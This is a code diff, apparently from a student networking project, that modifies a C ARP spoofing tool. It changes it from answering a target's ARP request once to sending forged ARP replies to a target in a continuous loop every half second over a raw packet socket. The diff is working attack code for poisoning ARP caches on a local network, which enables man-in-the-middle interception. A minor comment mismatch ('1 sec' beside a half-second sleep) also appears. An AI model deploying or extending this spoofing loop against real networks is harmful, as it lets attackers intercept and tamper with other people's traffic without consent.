@@ -40,12 +40,12 @@ int check_available_interface(void) {
                 ft_memcpy(global_data.interface_name, ifa->ifa_name, IF_NAMESIZE);
 
                 // Get interfface index for bind
-                // global_data.interface_index = if_nametoindex(ifa->ifa_name);
-                // if (global_data.interface_index == 0) {
-                //     fprintf(stderr, "Error: Could not get interface index for %s\n", ifa->ifa_name);
-                //     freeifaddrs(ifaddr);
-                //     return 1;
-                // }
+                global_data.interface_index = if_nametoindex(ifa->ifa_name);
+                if (global_data.interface_index == 0) {
+                    fprintf(stderr, "Error: Could not get interface index for %s\n", ifa->ifa_name);
+                    freeifaddrs(ifaddr);
+                    return 1;
+                }
 
                 printf("\nFound active interface:\n");
                 printf("  Interface Name: %s\n", global_data.interface_name);
@@ -291,7 +291,7 @@ void create_arp_response_packet(unsigned char *buffer) {
 
 void start_arp_spoofing(void) {
     struct sockaddr_ll sockaddr;
-    socklen_t addrlen = sizeof(sockaddr);
+    memset(&sockaddr, 0, sizeof(struct sockaddr_ll));
 
     global_data.sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
     if (global_data.sockfd == -1) {
@@ -299,85 +299,25 @@ void start_arp_spoofing(void) {
         exit(1);
     }
 
-
-    // Binding a socket to an interface
-    // SO_BINDTODEVICE is deprecated since 1999. Use bind() with a struct sockaddr_ll instead
-    if (setsockopt(global_data.sockfd, SOL_SOCKET, SO_BINDTODEVICE, global_data.interface_name, ft_strlen(global_data.interface_name)) < 0) {
-        fprintf(stderr, "Error: Failed to bind to device %s: %s\n", global_data.interface_name, strerror(errno));
-        close(global_data.sockfd);
-        exit(1);
-    }
-
-    // ft_bzero(&sockaddr, 0);
-    // sockaddr.sll_family = AF_PACKET;
-    // sockaddr.sll_protocol = htons(ETH_P_ARP);
-    // sockaddr.sll_ifindex = global_data.interface_index;
-
-    // if (bind(global_data.sockfd, (struct sockaddr *)&sockaddr, sizeof(sockaddr)) != 0) {
-	// 	dprintf(STDERR_FILENO, "Failed to bind socket to INADDR_ANY option because: %s\n", strerror(errno));
-	// 	close(global_data.sockfd);
-    //     exit(1);
-	// }
-
-    printf("Waiting for ARP request on interface: %s\n", global_data.interface_name);
-    printf("---------------------------------------------\n");
-    printf("*\n*\n");
-
+    sockaddr.sll_protocol = htons(ETH_P_ARP);
+    sockaddr.sll_ifindex = global_data.interface_index;
 
     while(1) {
         unsigned char buffer[BUFFER_SIZE] = {0};
 
-        ssize_t len = recvfrom(global_data.sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&sockaddr, &addrlen);
+        // ARP-reply preparation
+        create_arp_response_packet(buffer);
+        print_headers(buffer);
 
-        if (len < 0) {
-            fprintf(stderr, "Error: Recvfrom failed: %s\n", strerror(errno));
-            close(global_data.sockfd);
-            exit(1);
-        }
-
-        t_ethernet_header *eth_header = (t_ethernet_header *)buffer;
-        t_arp_header *arp_header = (t_arp_header *)(buffer + sizeof(t_ethernet_header));
-
-        // Check ARP protocol and ARP-request option
-        if (ntohs(eth_header->ethertype) == ETH_P_ARP && ntohs(arp_header->operation) == 1) {
-
-            if (ntohs(arp_header->ptype) != ETH_P_IP) {
-                fprintf(stderr, "Error: IP address is not IPv4!\n");
+        if (sendto(global_data.sockfd, &buffer, sizeof(t_ethernet_header) + sizeof(t_arp_header), 0,
+            (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0) {
+                fprintf(stderr, "Error: Sendto failed: %s\n", strerror(errno));
                 close(global_data.sockfd);
                 exit(1);
-	    	}
-
-            unsigned char* sender_mac = arp_header->sender_mac;
-            unsigned char* sender_ip = arp_header->sender_ip;
-
-            if (ft_memcmp(sender_ip, global_data.target_ip, INET4_LEN) == 0 &&
-                ft_memcmp(sender_mac, global_data.target_mac, ETH_ALEN) == 0) {
-
-                if (global_data.f_verbo) {
-                    printf("New ARP request from target:\n\n");
-                    print_headers(buffer);
-                }
-
-                // ARP-reply preparation
-                create_arp_response_packet(buffer);
-
-                if (global_data.f_verbo) {
-                    printf("ARP spoofed reply to target:\n\n");
-                    print_headers(buffer);
-                }
-
-                if (sendto(global_data.sockfd, &buffer, sizeof(t_ethernet_header) + sizeof(t_arp_header), 0,
-                    (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0) {
-                        fprintf(stderr, "Error: Sendto failed: %s\n", strerror(errno));
-                        close(global_data.sockfd);
-                        exit(1);
-                }
-
-                printf("ARP Reply sent\n");
-                close(global_data.sockfd);
-                break;
-            }
         }
+
+        printf("ARP Reply sent\n");
+        usleep(500000); // 1 sec
     }
 }
 
